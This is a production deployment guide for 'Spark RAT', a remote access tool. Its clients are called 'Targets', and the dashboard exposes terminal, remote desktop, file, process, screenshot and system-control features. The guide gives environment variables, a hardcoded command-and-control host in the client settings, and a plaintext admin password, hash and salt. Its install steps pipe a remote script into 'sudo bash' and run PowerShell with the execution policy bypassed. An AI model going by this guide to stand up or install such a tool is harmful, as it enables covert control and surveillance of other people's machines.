# Production Environment Configuration Guide

## Overview

This guide provides comprehensive configuration for the Spark RAT system in production, including security, monitoring, and operational considerations.

## System Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Frontend      │    │   Backend       │    │   Clients       │
│   (Vercel)      │◄──►│   (Render)      │◄──►│   (Targets)     │
│   - React App   │    │   - Go Server   │    │   - Windows     │
│   - Dashboard   │    │   - WebSocket   │    │   - Linux       │
│   - Real-time   │    │   - API         │    │   - macOS       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## Backend Configuration (Render)

### Environment Variables

Set these in your Render dashboard:

```bash
# Core Configuration
PORT=8000
GO_ENV=production

# Security
SPARK_SALT=a2dac101827c8d47f00831f2d6c078b2
SPARK_ADMIN_HASH=$2b$10$RYCAuSMeNE1uh2/qka5PSeE6RFjynbpXu95HMStXmUHA8qaQNBFjG

# Optional: Custom Configuration
SPARK_LOG_LEVEL=info
SPARK_MAX_CLIENTS=100
SPARK_HEARTBEAT_INTERVAL=30
```

### Security Configuration

1. **Authentication**
   - Admin password: `ChangeMe2024!SecurePassword`
   - Bcrypt hash: `$2b$10$RYCAuSMeNE1uh2/qka5PSeE6RFjynbpXu95HMStXmUHA8qaQNBFjG`
   - **IMPORTANT**: Change this password in production!

2. **Encryption**
   - Salt: `a2dac101827c8d47f00831f2d6c078b2`
   - All client-server communication is encrypted
   - **IMPORTANT**: Rotate this salt every 90 days!

3. **Network Security**
   - HTTPS only (Render enforces this)
   - WebSocket over WSS
   - CORS configured for frontend domain

## Frontend Configuration (Vercel)

### Environment Variables

Set these in your Vercel dashboard:

```bash
# Backend URLs
REACT_APP_API_URL=https://spark-backend-fixed-v2.onrender.com
REACT_APP_WS_URL=wss://spark-backend-fixed-v2.onrender.com

# Application
REACT_APP_NAME=Spark RAT Dashboard
REACT_APP_VERSION=2.0.0
REACT_APP_ENVIRONMENT=production

# Security
REACT_APP_ENABLE_HTTPS=true
REACT_APP_ENABLE_WEBSOCKETS=true

# Features
REACT_APP_ENABLE_TERMINAL=true
REACT_APP_ENABLE_DESKTOP=true
REACT_APP_ENABLE_FILE_MANAGER=true
REACT_APP_ENABLE_PROCESS_MANAGER=true
REACT_APP_ENABLE_SCREENSHOT=true
REACT_APP_ENABLE_SYSTEM_CONTROL=true

# Performance
REACT_APP_DEBUG=false
REACT_APP_LOG_LEVEL=error
REACT_APP_ENABLE_ANALYTICS=true
```

### Security Headers

The frontend is configured with security headers:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        }
      ]
    }
  ]
}
```

## Client Configuration

### Production Client Settings

Clients are pre-configured with:

```go
// Production configuration
Host: "spark-backend-fixed-v2.onrender.com"
Port: 443
Path: "/api"
Secure: true
Salt: "a2dac101827c8d47f00831f2d6c078b2"
```

### Client Installation

1. **Windows**
   ```powershell
   Invoke-WebRequest -Uri "https://your-frontend.vercel.app/install-windows.ps1" -OutFile "install.ps1"
   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
   .\install.ps1
   ```

2. **Linux/macOS**
   ```bash
   curl -sSL https://your-frontend.vercel.app/install-linux.sh | sudo bash
   ```

## Monitoring and Logging

### Backend Monitoring

1. **Render Dashboard**
   - Monitor service health
   - Check resource usage
   - View deployment logs

2. **Application Logs**
   - Client connections
   - API requests
   - Error tracking

3. **Health Checks**
   - Endpoint: `/api/info`
   - Interval: 30 seconds
   - Timeout: 3 seconds

### Frontend Monitoring

1. **Vercel Analytics**
   - Page views
   - Performance metrics
   - User interactions

2. **Error Tracking**
   - JavaScript errors
   - Network failures
   - User feedback

## Security Best Practices

### 1. Password Security

```bash
# Generate new admin password hash
python3 -c "
import bcrypt
password = 'YourNewSecurePassword123!'
salt = bcrypt.gensalt()
hash = bcrypt.hashpw(password.encode('utf-8'), salt)
print(f'SPARK_ADMIN_HASH={hash.decode()}')
"
```

### 2. Salt Rotation

```bash
# Generate new salt
openssl rand -hex 16
# Update both backend and client configurations
```

### 3. SSL/TLS

- Render provides automatic SSL certificates
- Vercel provides automatic SSL certificates
- All communication is encrypted

### 4. Access Control

- Use strong admin passwords
- Implement rate limiting
- Monitor for suspicious activity
- Regular security audits

## Performance Optimization

### Backend Optimization

1. **Resource Limits**
   - Memory: 512MB (Render Starter)
   - CPU: Shared
   - Storage: 1GB

2. **Connection Management**
   - Max clients: 100
   - Heartbeat interval: 30s
   - Connection timeout: 60s

### Frontend Optimization

1. **Build Optimization**
   - Code splitting
   - Tree shaking
   - Minification
   - Compression

2. **Caching**
   - Static assets: 1 year
   - API responses: No cache
   - CDN: Global distribution

## Backup and Recovery

### 1. Configuration Backup

```bash
# Backup environment variables
vercel env pull .env.backup
render env list > render-env.backup
```

### 2. Code Backup

```bash
# Backup source code
git clone https://github.com/your-repo/spark-rat.git
tar -czf spark-rat-backup-$(date +%Y%m%d).tar.gz spark-rat/
```

### 3. Disaster Recovery

1. **Backend Recovery**
   - Redeploy from Git
   - Restore environment variables
   - Verify health checks

2. **Frontend Recovery**
   - Redeploy from Git
   - Restore environment variables
   - Test functionality

## Maintenance

### Daily Tasks

- [ ] Check service health
- [ ] Monitor error logs
- [ ] Review client connections
- [ ] Check resource usage

### Weekly Tasks

- [ ] Security audit
- [ ] Performance review
- [ ] Backup verification
- [ ] Update dependencies

### Monthly Tasks

- [ ] Rotate secrets
- [ ] Security assessment
- [ ] Performance optimization
- [ ] Documentation update

## Troubleshooting

### Common Issues

1. **Backend Won't Start**
   - Check environment variables
   - Verify Docker build
   - Check Render logs

2. **Frontend Can't Connect**
   - Verify backend URL
   - Check CORS settings
   - Test network connectivity

3. **Client Connection Issues**
   - Verify salt configuration
   - Check firewall settings
   - Test network connectivity

### Debug Commands

```bash
# Check backend health
curl https://spark-backend-fixed-v2.onrender.com/api/info

# Check frontend
curl https://your-frontend.vercel.app

# Test WebSocket
wscat -c wss://spark-backend-fixed-v2.onrender.com/ws
```

## Support and Documentation

### Resources

- **Backend Documentation**: See `spark-setup/spark-backend/README.md`
- **Frontend Documentation**: See `spark-setup/spark-frontend/README.md`
- **Deployment Guides**: See `RENDER_DEPLOYMENT_GUIDE.md` and `VERCEL_DEPLOYMENT_GUIDE.md`

### Contact

- **Issues**: GitHub Issues
- **Documentation**: Project README files
- **Support**: Check troubleshooting guides

---

**Configuration Status**: Ready for production
**Last Updated**: $(date)
**Version**: 2.0.0